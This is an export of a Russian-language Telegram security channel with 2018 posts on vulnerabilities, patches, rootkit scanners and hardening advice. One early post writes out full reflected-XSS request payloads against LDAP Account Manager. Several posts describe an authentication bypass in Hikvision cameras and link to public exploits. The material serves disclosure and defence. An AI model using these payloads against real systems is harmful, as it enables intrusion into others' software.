<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;xss&quot;)">#xss</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>В LDAP Account Manager ниже версии 6.3 ряд параметров допускает отраженную XSS. Даже и не обфусцированную вовсе, например так:<br><br><code>GET /lam/templates/3rdParty/pla/htdocs/cmd.php?cmd=add_attr_form&amp;server_id=1&amp;dn=cn%3xxxxx%2cou%3dpeople%2cdc%3dpl%2cdc%3ds2-eu%2cdc%3dxxxx%2cdc%3dlocalru0bz%3cscript%3ealert(document.domain)%3c%2fscript%3eu89iu HTTP/1.1</code><br><br>или<br><br><code>GET /lam/templates/3rdParty/pla/htdocs/cmd.php?cmd=rename_form&amp;server_id=1&amp;dn=cn%3Dtechnic%2Cou%3Dpeople%2Cdc%3Dpl%2Cdc%3Ds2-eu%2Cdc%3Dxxxx%2Cdc%3Dlocal&amp;template=noneuaax6%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ev7rfn HTTP/1.1</code><br><br>и еще <br><br><code>GET /lam/templates/upload/masscreate.php?type=userawvpj%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ev0car HTTP/1.1</code><br><br>Дыры обозваны CVE-2018-8763 и устранены в недавно выпущенной версии 6.3 <a href="https://www.ldap-account-manager.org/lamcms/changelog">https://www.ldap-account-manager.org/lamcms/changelog</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-130">

      <div class="body details">
27 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message146">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="27.03.2018 12:43:30">
12:43
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;камеры&quot;)">#камеры</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>А тут вот это...бэкдор в камерах. Hikvision. Не то чтобы это новость, про него еще в прошлом году известно стало, но недавно выпустили еще скрипт, который пароль меняет через этот бэкдор.<br><br>Есть в веб-интерфесе этих камер параметр auth. И если передать в нем &quot;логин:пароль&quot; в Base64, они принимаются как данные для авторизации. Вот только пароль игнорируется!) Стандартная учетка - admin.<br><br>Актуально для версий от 5.2.0 до 5.3.9 (builds от 140721 до 170109). Обновления доступны.<br><br>Описание уязвимости с примерами URL: <a href="http://seclists.org/fulldisclosure/2017/Sep/23">http://seclists.org/fulldisclosure/2017/Sep/23</a><br>&quot;Эксплойт&quot;, который пароль меняет: <a href="https://packetstormsecurity.com/files/146910/Hikvision-IP-Camera-5.3.9-Access-Control-Bypass.html">https://packetstormsecurity.com/files/146910/Hikvision-IP-Camera-5.3.9-Access-Control-Bypass.html</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-131">

      <div class="body details">
29 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message147">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="29.03.2018 14:28:06">
14:28
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;tools&quot;)">#tools</a> <a href="" onclick="return ShowHashtag(&quot;malware&quot;)">#malware</a><br><br>Каждый безопасник немножко ипохондрик. Во имя удовлетворения потребности избавиться от какой-нибудь малвари, даже если ее нет, сегодня рассмотрим охоту на руткиты.<br><br>Если дело серьезно, то сначала надо отключить съемные носители и подключение к сети. Перезагружаться или включать safe mode как раз не стоит, потому что большинство антируткитов проверяют запущенные процессы и подгруженные библиотеки. Впрочем некоторые поддерживают и безопасный режим.<br><br><strong>Gmer</strong> <a href="http://www.gmer.net">http://www.gmer.net</a><br>Внимательная штучка, ищет скрытые объекты системы разного рода. Но интерпретация требует скилов или хотя бы интуиции криминалиста.<br><br><strong>Farbar Recovery Scan Tool</strong> (64bit) <a href="http://www.bleepingcomputer.com/download/farbar-recovery-scan-tool/dl/82/">http://www.bleepingcomputer.com/download/farbar-recovery-scan-tool/dl/82/</a> (32bit) <a href="http://www.bleepingcomputer.com/download/farbar-recovery-scan-tool/dl/81/">http://www.bleepingcomputer.com/download/farbar-recovery-scan-tool/dl/81/</a><br>Руткиты не определяет, но проводит полную инвентаризацию значимых для их поиска объектов. Результаты можно отдать на анализ где-то тут <a href="https://www.bleepingcomputer.com/forums/f/22/virus-trojan-spyware-and-malware-removal-logs/">https://www.bleepingcomputer.com/forums/f/22/virus-trojan-spyware-and-malware-removal-logs/</a>.<br><br><strong>RogueKiller</strong> <a href="http://www.bleepingcomputer.com/download/roguekiller/">http://www.bleepingcomputer.com/download/roguekiller/</a><br>Ищет руткиты и другие вредоносы. Ничего необычного, работает как ожидается.<br><br><strong>TDSSKiller</strong> <a href="http://support.kaspersky.com/downloads/utils/tdsskiller.exe">http://support.kaspersky.com/downloads/utils/tdsskiller.exe</a><br>Шустренько проверит BIOS и MBR.<br><br><strong>Sophos Virus Removal Tool</strong> <a href="http://downloads.sophos.com/tools/withides/Sophos%20Virus%20Removal%20Tool.exe">http://downloads.sophos.com/tools/withides/Sophos%20Virus%20Removal%20Tool.exe</a><br>Огромная, ну ооочень медленная махина. При использовании рекомендуется отключить сеть, выключить все программы и отключить антивирусную защиту в реальном времени.<br><br><strong>UnHackMe</strong> <a href="http://www.greatis.com/unhackme/">http://www.greatis.com/unhackme/</a><br>Не только по руткитам, но и по прочей малвари, даже в расширениях браузеров. Тут вам придется многое делать вручную, ибо заметную часть объектов тулза считает &quot;неизвестными&quot; и предлагает, например, отправить на вирустотал.
       </div>

      </div>

     </div>

     <div class="message service" id="message-132">

      <div class="body details">
30 March 2018
      </div>

     </div>

     <div class="message default clearfix" id="message148">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="30.03.2018 11:38:00">
11:38
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Drupal обновили?<br>Хорошо, тогда можно на этом не останавливаться.<br><br>А поговорим лучше о новом модуле metasploit exploit/windows/http/gitstack_rce. Это про GitStack и CVE-2018-5955, вполне себе great RCE через веб-интерфейс. Эксплойтик: <a href="https://www.exploit-db.com/exploits/44356/">https://www.exploit-db.com/exploits/44356/</a><br><br>А драма в том, что текущая версия все еще 2.3.10, та самая, в которой нашли уязвимость.<br><br>Так что если у вас такой зверь заведен, отключайте веб-интерфейс или хотя бы ограничивайте к нему доступ.
       </div>

      </div>

     </div>

     <div class="message service" id="message-133">

      <div class="body details">
2 April 2018
      </div>

     </div>

     <div class="message default clearfix" id="message149">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="02.04.2018 11:38:49">
11:38
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;Windows&quot;)">#Windows</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>&quot;Никогда не исправляйте известную ошибку в программе, так как это может привести к появлению произвольного числа неизвестных&quot; (с,юмор)<br><br>Майкрософт выпустила патч на патч на патч KB4100480 для Windows 7 и Windows Server 2008 R2. Чего делать то? Радоваться возможности поворчать и обновляться, обновляться, обновляться. Что может быть проще!<br><br>А если нельзя вот так просто взять и обновить сервер?<br><br>Тогда при надобности его можно обезопасить другим способом (способ не единственный, но наиболее общий):<br><br>1. Поместить в отдельный сетевой сегмент (можно с другими неудачниками такой же степени критичности, можно Private Vlan, можно просто отдельный сетевой сегмент)<br><br>2. Запретить к нему ВЕСЬ сетевой доступ. Разрешить доступ только для админов, которые тоже в отдельном сетевом сегменте сидят<br><br>3. Проявлять крайнюю степень жлобства при открытии любого сетевого доступа к серваку-неудачнику. Держать в уме терминальные сервера, двухфакторную аутентификацию и VPN внутри локальной сети
       </div>

      </div>

     </div>

     <div class="message service" id="message-134">

      <div class="body details">
3 April 2018
      </div>

     </div>

     <div class="message default clearfix" id="message150">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="03.04.2018 11:20:42">
11:20
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a><br><br>А Длинки опять косячат. DIR-601 раскрывает пароль встроенного админа. Через веб-интерфейс. По словам исследователя - только из локальной сети.<br><br>В общем вот тут приводится последовательность хттп-запросов, чтоб получить заветный пасс: <a href="https://www.exploit-db.com/exploits/44388/">https://www.exploit-db.com/exploits/44388/</a><br><br>Патча пока нет. Или вообще...это ж длинк
       </div>

      </div>

     </div>

     <div class="message service" id="message-135">

      <div class="body details">
5 April 2018
      </div>

     </div>

     <div class="message default clearfix" id="message151">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="05.04.2018 10:57:16">
10:57
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;Microsoft&quot;)">#Microsoft</a> опять <a href="" onclick="return ShowHashtag(&quot;недоисправляли&quot;)">#недоисправляли</a>. В Microsoft Edge на этот раз<br><br>Оригинальная бага CVE-2018-0776: <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1420">https://bugs.chromium.org/p/project-zero/issues/detail?id=1420</a><br><br>Недоправили ее в январе, 8<br><br>А теперь стали доступны обновленные эксплойты на недоправленную уязвимость: <a href="https://www.exploit-db.com/exploits/44396/">https://www.exploit-db.com/exploits/44396/</a> (CVE-2018-0933), <a href="https://www.exploit-db.com/exploits/44397/">https://www.exploit-db.com/exploits/44397/</a> (CVE-2018-0934). Две баги из одной! Прогресс!
       </div>

      </div>

     </div>

     <div class="message service" id="message-136">

      <div class="body details">
6 April 2018
      </div>

     </div>

     <div class="message default clearfix" id="message152">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="06.04.2018 10:52:41">
10:52
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Веселье с Django, учитывая скорость исправления проблемы, наверно, еще не закончилось.<br><br>Всего лишь включенный DEBUG и приложение раскрывает кучу данных: содержимое <a href="settings.py">settings.py</a>, трейсы ошибок, а также ключи API, пароли СУБД, ключи AWS и еще еще чего-нибудь.<br><br>DEBUG включается, ровно как и выключается, в файле <a href="settings.py">settings.py</a>. По умолчанию он выключен. Но! Если создать проект с помощью <code>django-admin startproject</code>, то он будет включен! Запутать хотели, да?
       </div>

      </div>

     </div>

     <div class="message default clearfix joined" id="message153">

      <div class="body">

       <div class="pull_right date details" title="06.04.2018 11:04:07">
11:04
       </div>

       <div class="text">
Очень лень об этом писать, но мало ли...<br><br>Когда <strong>телеграм наконец заблокируют</strong>, нужно прописать <strong>прокси</strong> в настройках:<br>Settings<br>в самом низу Advaced Settings<br>там Connection Type, жмакнуть и ввести прокси<br><br>Прокси можно тут поискать:<br><a href="http://opentg.us">http://opentg.us</a><br><a href="http://fuckrkn.us">http://fuckrkn.us</a><br><a href="http://telegram.veesecurity.com">http://telegram.veesecurity.com</a><br><a href="https://www.google.com">https://www.google.com</a><br><br>А можно даже автонастройкой воспользоваться (есть нюансы, но вы наверно о них знаете):<br><a href="http://12345.opentg.us">http://12345.opentg.us</a><br><a href="http://12345.fuckrkn.us">http://12345.fuckrkn.us</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-137">

      <div class="body details">
9 April 2018
      </div>

     </div>

     <div class="message default clearfix" id="message154">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="09.04.2018 11:14:29">
11:14
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>Сыски в огне!<br><br>А именно - их свичи, а именно - под RCE обстрелом.<br><br>Уязвимость CVE-2018-0171, ну вы уже знаете. Вполне себе надежная RCE, либо можно постоянную перезагрузку замутить. Реализуется как переполнение буфера через трафик на порт TCP 4786, это сервис клиента Cisco Smart Install, <strong>по умолчанию он включен и порт открыт</strong>.<br><br>Эксплойт...Исследователи опубликовали PoC, который сбрасывает настройки свича (в конце статьи <a href="https://embedi.com/blog/cisco-smart-install-remote-code-execution/">https://embedi.com/blog/cisco-smart-install-remote-code-execution/</a>). Но судя по активности атак в интернете существуют непубличные рабочие RCE.<br><br>Подробное описание уязвимости тоже тут <a href="https://embedi.com/blog/cisco-smart-install-remote-code-execution/">https://embedi.com/blog/cisco-smart-install-remote-code-execution/</a><br><br><strong>Как устранить:</strong><br><br><code>switch#no vstack</code>  (легким движением руки отключаем Smart Install Client)<br><br>или же вешаем ACL на доступ к TCP 4786, если Smart Install Client нужен<br><br>можно поставить патч (<a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2</a>), но лучше просто отключить клиент, ибо он и без CVE-2018-0171 проблемный по безопасности<br><br><strong>Как проверить:</strong><br><br><code>nmap -sS -p4786 -Pn -n -v &lt;addresses&gt;</code>  (найти свичи)<br><br><code>switch#show vstack config | inc Role</code>  (проверить, включен ли SmartInstall на свиче)<br><br><strong>Модели, которые уязвимы/возможно уязвимы:</strong><br><br>Catalyst 4500 Supervisor Engines<br>Catalyst 3850 Series<br>Catalyst 3750 Series<br>Catalyst 3650 Series<br>Catalyst 3560 Series<br>Catalyst 2960 Series<br>Catalyst 2975 Series<br>IE 2000<br>IE 3000<br>IE 3010<br>IE 4000<br>IE 4010<br>IE 5000<br>SM-ES2 SKUs<br>SM-ES3 SKUs<br>NME-16ES-1G-P<br>SM-X-ES3 SKUs
       </div>

      </div>

     </div>

     <div class="message service" id="message-138">

      <div class="body details">
10 April 2018
      </div>

     </div>

     <div class="message default clearfix" id="message155">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="10.04.2018 11:28:35">
11:28
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>Уязвимости в системах хранения паролей - это особая маковка. Вот CyberArk Password Vault Web Access отличился наличием RCE (CVE-2018-9843).<br><br>Уязвимость позволяет выполнить произвольный код на сервере с правами веб-приложения через выполнение произвольных команд. Для эксплуатации нужен доступ к API на /PasswordVault/WebServices, аутентификация не нужна.<br><br>Пример эксплуатации: <a href="https://www.exploit-db.com/exploits/44429/">https://www.exploit-db.com/exploits/44429/</a>.<br><br>Производитель отреагировал своевременно и уязвимость пофикшена в версиях 9.9.5, 9.10 и 10.2. А еще можно просто отключить указанный API.<br><br>А в версиях до 9.7 и 10 есть раскрытие памяти (CVE-2018-9842). Метод: <a href="https://www.exploit-db.com/exploits/44428/">https://www.exploit-db.com/exploits/44428/</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-139">

      <div class="body details">
11 April 2018
      </div>

     </div>

     <div class="message default clearfix" id="message156">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="11.04.2018 11:51:17">
11:51
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;tools&quot;)">#tools</a> <a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>Уязвимости в драйверах это очень неприятно. А еще неприятней, если вы обещали начальнику держать все up-to-date, и кто-то проболтался ему о существовании драйверов.<br><br>Для виндоус можно использовать софтиночку <strong>DriverUpdate</strong> (<a href="https://slimware.com/driverupdate">https://slimware.com/driverupdate</a>). Она быстро просканит все драйверы и вычислить устаревшие. А еще может сделать полный бэкап драйверов. И восстановление из этого бэкапа (с ним будьте аккуратней - стоит указать программе папку и она сразу кидается переустанавливать драйвера). А вот автоматическое обновление устаревших драйверов тут только по платной лицензии.<br><br>Cофтулина <strong>Snappy Driver Installer</strong> (<a href="https://sdi-tool.org">https://sdi-tool.org</a>) полностью бесплатная. Несмотря на вырвиглазный интерфейс (ничего, привыкнете), нашла заметно больше обновлений, чем предыдущая. Плюс можно сразу скачать и установить. Еще SDI дает возможность скачать сразу все драйверпаки себе на память или выбрать кастомные драйверпаки для анализа обновлений. А вот функции бэкапа установленных драйверов отсутствуют.
       </div>

      </div>

     </div>

     <div class="message service" id="message-140">

      <div class="body details">
12 April 2018
      </div>

     </div>

     <div class="message default clearfix" id="message157">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="12.04.2018 11:50:03">
11:50
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>Когда-то мы &quot;обсуждали&quot; возможности и настройку EMET на машинках виндоус. В 10 же EMET устанавливать не надо, он встроен, но называется уже Exploit Guard.<br><br>Однако по умолчанию ВСЕ методы защиты отключены.<br><br>Включить их можно в Центра безопасности Защитника Windows (Параметры-&gt;Защитник Windows). Далее открываем Управление приложениями и браузером-&gt;Защита от эксплойтов:Параметры защиты от эксплойтов. И тут у нас есть DEP, SEHOP, ASLR, фильтрация таблиц адресов экспорта (EAF), проверка дескриптора. Однако надо помнить, что просто включив какую-то функцию, можно помешать работе нужных программ, так что экспериментировать с оглядкой.
       </div>

      </div>

     </div>

     <div class="message service" id="message-141">

      <div class="body details">
13 April 2018
      </div>

     </div>

     <div class="message default clearfix" id="message158">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="13.04.2018 11:26:45">
11:26
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;windows&quot;)">#windows</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>Кошмар безопасника - когда можно скомпрометировать хост, просто заставив юзера открыть ссылку. <br><br>На этой неделе Microsoft исправила пачку таких: CVE-2018-1010, CVE-2018-1012, CVE-2018-1013, CVE-2018-1015, CVE-2018-1016, CVE-2018-1004. Первые пять - проблемы в библиотеке обработки шрифтов Windows, последняя - в Windows VBScript Engine.<br><br>Да-да, автоматические обновления и все такое...При такой критичности важно убедиться, что все успешно установилось.<br><br><strong>Вот какие KB должны быть установлены:</strong><br><br>Windows 10 - 4093111<br>Windows 10 Version 1511 - 4093109<br>Windows 10 Version 1607 - 4093119<br>Windows 10 Version 1703 - 4093107<br>Windows 10 Version 1709 - 4093112<br>Windows 7 - 4093118 или 4093108<br>Windows 8.1 - 4093114 или 4093115<br>Windows Server 2008 - 4093223<br>Windows Server 2008 R2 - 4093118 или 4093108<br>Windows Server 2012 - 4093123 или 4093122<br>Windows Server 2012 R2 - 4093114 или 4093115<br>Windows Server 2016 - 4093119<br>Windows Server, version 1709 - 4093112
       </div>

      </div>

     </div>

     <div class="message service" id="message-142">

      <div class="body details">
16 April 2018
      </div>

     </div>

     <div class="message default clearfix" id="message159">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="16.04.2018 11:10:41">
11:10
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;приклад&quot;)">#приклад</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>Да-да, вы уже обновили Drupal до версии 8.5.1. Правда ведь?<br><br>Потому что вот и эксплойт опубликовали. Эксплойт изи, 5 строк кода, разберется даже школьник: <a href="https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py">https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py</a>. Плюс подробное описание пути эксплуатации: <a href="https://research.checkpoint.com/uncovering-drupalgeddon-2/">https://research.checkpoint.com/uncovering-drupalgeddon-2/</a>.<br><br>Уязвимость CVE-2018-7600 (Drupalgeddon 2) присутствует в версиях 6.х, 7.х до 7.58, 8.х до 8.3.9, 8.4.x до 8.4.6 и 8.5.x до 8.5.1.
       </div>

      </div>

     </div>

     <div class="message service" id="message-143">

      <div class="body details">
17 April 2018
      </div>

     </div>

     <div class="message default clearfix" id="message160">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="17.04.2018 08:56:18">
08:56
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="pull_left forwarded userpic_wrap">

        <div class="userpic userpic6" style="width: 42px; height: 42px">

         <div class="initials" style="line-height: 42px">
C
         </div>

        </div>

       </div>

       <div class="forwarded body">

        <div class="from_name">
Cybersecurity &amp; Co. <span class="details"> 17.04.2018 00:52:49</span>
        </div>

        <div class="text">
Говорят, самое время напомнить: <br><a href="https://goo.gl/rXJqZS">https://goo.gl/rXJqZS</a>
        </div>

       </div>

      </div>

     </div>

     <div class="message default clearfix" id="message161">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="17.04.2018 10:38:09">
10:38
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
&quot;Похоже скоро, кроме телеграм, в российском интернете больше ничего работать не будет)&quot; (c)<br>&quot;Мне лично не принципиально что там с Телеграммом, но блокировка кучи непричастных IP — это очень плохо. Это как «мы не знаем кто тут у вас в городе преступник, давайте всех посадим».&quot; (c)<br><br>&quot;не работают или частично не работают сервисы крупных ритейл-компаний, банков из топ-20, частных клиник&quot;<br><a href="api.nuget.org">api.nuget.org</a><br><a href="https://www.microsoft.com/en-us/software-download/office">https://www.microsoft.com/en-us/software-download/office</a><br>&quot;Пользователи утверждали, что кассы не работали в магазинах «Дикси»&quot;<br>&quot;безналичная оплата также не работала по крайней мере в некоторых «Пятерочках», «Монетках» и «Бургер Кингах»&quot;<br>&quot;о неполадках сообщила онлайн-школа английского языка Skyeng&quot;<br>&quot;Недоступны оказались небольшие интернет-магазины и курьерские службы&quot;<br>и &quot;100500&quot; ресурсов небольших компаний и физических лиц<br><br>Пошли сообщения, что Роскомнадзор успокоился и снял ковровые блокировки. Не проверяла. В любом случае, осадочек то останется.
       </div>

      </div>

     </div>

     <div class="message service" id="message-144">

      <div class="body details">
18 April 2018
      </div>

     </div>

     <div class="message default clearfix" id="message162">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="18.04.2018 11:33:58">
11:33
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;Windows&quot;)">#Windows</a> <a href="" onclick="return ShowHashtag(&quot;exploit&quot;)">#exploit</a> <a href="" onclick="return ShowHashtag(&quot;обновления&quot;)">#обновления</a><br><br>Дежа вю, еще эксплойтов для винды подвалило! Тут все про раскрытие памяти. И да, все по честному, патчи выпущены, только не забывайте следить, что все норм установилось.<br><br>CVE-2018-0968 - Раскрытие памяти (стека) - х64 версии от Windows 8 до 10 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1519">https://bugs.chromium.org/p/project-zero/issues/detail?id=1519</a><br><br>CVE-2018-0969 - Раскрытие памяти (стека) - 32/64 от Windows 7 до 10 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1511">https://bugs.chromium.org/p/project-zero/issues/detail?id=1511</a><br><br>CVE-2018-0970 - Раскрытие памяти (стека) - 32/64 Windows 10 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1512">https://bugs.chromium.org/p/project-zero/issues/detail?id=1512</a><br><br>CVE-2018-0971 - Раскрытие памяти (стека) - х64 версии от Windows 7 до 10 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1513">https://bugs.chromium.org/p/project-zero/issues/detail?id=1513</a><br><br>CVE-2018-0972 - Раскрытие памяти (пула) - 32/64 от Windows 7 до 10 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1515">https://bugs.chromium.org/p/project-zero/issues/detail?id=1515</a><br><br>CVE-2018-0973 - Раскрытие памяти (стека и пула) - х64 версии от Windows 7 до 10 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1516">https://bugs.chromium.org/p/project-zero/issues/detail?id=1516</a><br><br>CVE-2018-0974 - Раскрытие памяти (стека) - х64 версии от Windows 7 до 10 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1518">https://bugs.chromium.org/p/project-zero/issues/detail?id=1518</a><br><br>CVE-2018-0975 - Раскрытие памяти (стека) - 32/64 от Windows 7 до 10 - <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1510">https://bugs.chromium.org/p/project-zero/issues/detail?id=1510</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-145">

      <div class="body details">
19 April 2018
      </div>

     </div>

     <div class="message default clearfix" id="message163">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="19.04.2018 11:43:10">
11:43
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
<a href="" onclick="return ShowHashtag(&quot;network&quot;)">#network</a> <a href="" onclick="return ShowHashtag(&quot;конфигурация&quot;)">#конфигурация</a><br><br>3 дня назад US-CERT выпустила предупреждение об активности &quot;российских проправительственных&quot; хакеров. Активность эта направлена на сетевые устройства. Половина документа посвящена рекомендациям по защите:<br><br>1. Отключить доступ к интерфейсам управления из интернета.<br><br>2. Отключить устаревшие нешифрованные протоколы &quot;такие как Telnet, SNMPv1, v2c&quot;.<br><br>3. Сменить дефолтные пароли (!) и внедрить &quot;strong password policy&quot;. В частности, не использовать один пароль на нескольких устройствах, а еще можно двухфакторную аутентификацию замутить.<br><br>4. Использовать поддерживаемую версию оборудования/софта и своевременно устанавливать апдейты. И требовать того же от провайдеров.<br><br>5. Проверить целостность образов имеющихся прошивок и ОС.<br><br>6. Ограничить TFTP-трафик избранными секурными хостами.<br><br>7. Обезопасить Smart Install.<br><br>8. Проверить отсутствие посторонних GRE-туннелей.<br><br>Оригинал документа: <a href="https://www.us-cert.gov/ncas/alerts/TA18-106A">https://www.us-cert.gov/ncas/alerts/TA18-106A</a>
       </div>

      </div>

     </div>

     <div class="message service" id="message-146">

      <div class="body details">
26 April 2018
      </div>

     </div>

     <div class="message default clearfix" id="message164">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="26.04.2018 12:36:45">
12:36
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
